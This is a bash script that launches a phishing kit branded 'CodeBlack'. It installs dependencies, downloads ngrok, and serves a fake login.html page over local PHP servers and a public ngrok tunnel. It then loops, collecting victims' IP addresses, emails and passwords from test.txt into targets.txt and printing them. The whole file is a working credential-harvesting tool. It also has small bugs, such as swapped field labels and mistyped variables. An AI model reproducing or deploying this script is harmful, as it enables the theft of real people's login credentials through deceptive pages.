#!/bin/bash
############# set color ###########
red="\e[1;31m"  #RED
green="\e[1;32m" #GREEN
yellow="\e[1;33m" #YELLOW
blue="\e[1;34m" #BLUE
cyan="\e[1;36m" #CYAN
link="\e[4;32m" #GREEB-LINK
########### check packages ###########
op=$(uname -o)
if [ $op = "GNU/Linux" ]; #install pkg in Linux
        which ruby > /dev/null;[ $? -eq 1 ] && sudo apt-get install figlet -y;sudo apt-get install ruby -y ; gem install lolcat|| sleep 1
	which python3 > /dev/null
	if [ $? -eq 1 ];
	then
		sudo apt-get install python -y
	else
		sleep 1
	fi
	which php > /dev/null
	if [ $? -eq 1 ];
	then
		sudo apt-get install php -y
	else
		sleep 1
	fi
	which curl > /dev/null
	if [ $? = 1 ];
	then
		sudo apt-get install curl -y
	else
		sleep 1
	fi
	which jq > /dev/null
	if [ $? = 1 ];
	then
		sudo apt-get install jq -y
	else
		sleep 1
	fi
	which unzip > /dev/null
	if [ $? = 1 ];
	then
		sudo apt-get install unzip -y
	else
		sleep 1
	fi
else
	if [ $op = "Android" ];  # install pkg in Termux
	then 
                which ruby > /dev/null;[ $? -eq 1 ] && pkg install figlet;pkg install ruby -y ; gem install lolcat|| sleep 1
		which python > /dev/null
		if [ $? = 1 ]
		then
			pkg install python -y
		else
			sleep 1
		fi
		which php > /dev/null
		if [ $? = 1 ];
		then
			pkg install php -y 
		else
			sleep 1
		fi
     		which curl > /dev/null
        	if [ $? = 1 ];
        	then
                	pkg install curl -y
        	else
        	        sleep 1
        	fi
        	which jq > /dev/null
        	if [ $? = 1 ];
        	then
                	pkg install jq -y
        	else
                	sleep 1
        	fi
		    which unzip > /dev/null
	        if [ $? = 1 ];
        	then
                	pkg install unzip -y
        	else
	                sleep 1
	        fi

	else
		sleep 1
	fi
fi
if [ -f 'ngrok' ];    #install Ngrok
then
	sleep 1
else
	wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
	unzip ngrok-stable-linux-arm.zip
	rm ngrok-stable-linux-arm.zip
fi

###################### starting logo###############
clear
figlet CodeBlack | lolcat
sleep 2
###################### starting server ###############
netstat -nlt | grep 5555 > /dev/null
if [ $? = 0 ];
then
	fuser -k -n tcp 5555 &>/dev/null&
	php -S localhost:5555 &>/dev/null& #TURN ON SERVER PHP FOE LOCALHOST
	./ngrok http 5555 &>/dev/null&
	echo -e "$yellow[$red+$yellow]$blue Link: $link http://127.0.0.1:5555/login.html\e[0m"
	sleep 2
	netstat -nlt | grep 8080 > /null
	if [ $? = 0 ];
	then
		fuser -k -n tcp 8080 &>/dev/null&
		ifconfig | grep "192.*" > /dev/null
		if [ $? = 0 ];
		then
			ip=$(ifconfig | grep "192.*" -o | awk '{print $1}')
			php -S $ip:8080 &>/dev/null& 
			echo -e "$yellow[$red+$yellow]$blue Link: $link http://$ip:8080/login.html\e[0m" 
			sleep 2
		else
			sleep 0
		fi
	else
	       	ifconfig | grep "192.*" > /dev/null
                if [ $? = 0 ];
                then
                        ip=$(ifconfig | grep "192.*" -o | awk '{print $1}')
                        php -S $ip:8080 &>/dev/null& 
                        echo -e "$yellow[$red+$yellow]$blue Link: $link http://$ip:8080/login.html\e[0m" 
                        sleep 2
                else
                        sleep 0
                fi
	fi

else
	php -S localhost:5555 &>/dev/null&
	./ngrok http 5555 &>/dev/null&
	echo -e "$yellow[$red+$yellow]$blue Link: $link http://127.0.0.1:5555/login.html\e[0m"
	sleep 2
        netstat -nlt | grep 8080 > /dev/null
        if [ $? = 0 ];
        then
                fuser -k -n tcp 8080 &> /dev/null&
                ifconfig | grep "192.*" > /dev/null
                if [ $? = 0 ];
                then
                        ip=$(ifconfig | grep "192.*" -o | awk '{print $1}')
                        php -S $ip:8080 &>/dev/null&
			echo -e "$yellow[$red+$yellow]$blue Link: $link http://$ip:8080/login.html\e[0m" 
               		sleep 2
		 else
                        sleep 0
                fi
        else
                ifconfig | grep "192.*" > /dev/null
                if [ $? = 0 ];
                then
                        ip=$(ifconfig | grep "192.*" -o | awk '{print $1}')
                        php -S $ip:8080 &>/dev/null&  
                        echo -e "$yellow[$red+$yellow]$blue Link: $link http://$ip:8080/login.html\e[0m" 
                        sleep 2
                else
                        sleep 0
                fi
        fi
fi

ngrok="$(curl -s localhost:4040/api/tunnels | jq -r .tunnels[0].public_url)"
echo -e "$yellow[$red+$yellow]$blue Link: $link $ngrok/login.html\e[0m"
################ Print Links ################
while [ true ];
do
if [ -f "test.txt" ]
then
	size=$(wc -c test.txt | cut -d' ' -f1)
	cat test.txt >> targets.txt
	if [ $size -gt 20 ] && [ $size -lt 200 ];
	then
		ip=$(cat test.txt | grep "ip:" | cut -d':' -f2)
		name=$(cat test.txt | grep "pass:" | cut -d':' -f2)
		pass=$(cat test.txt | grep "email:" | cut -d':' -f2)
		rm test.txt
		printf "$green[$red+$green]$cayn %s\n" $ip
		sleep 2
		printf "$green[$red+$green]$cayn %s\n" $name
		sleep 2
		printf "$green[$red+$green]$cayn %s\n" $pass
		sleep 2
	else
		sleep 1
	fi
else
	sleep 1
fi
done



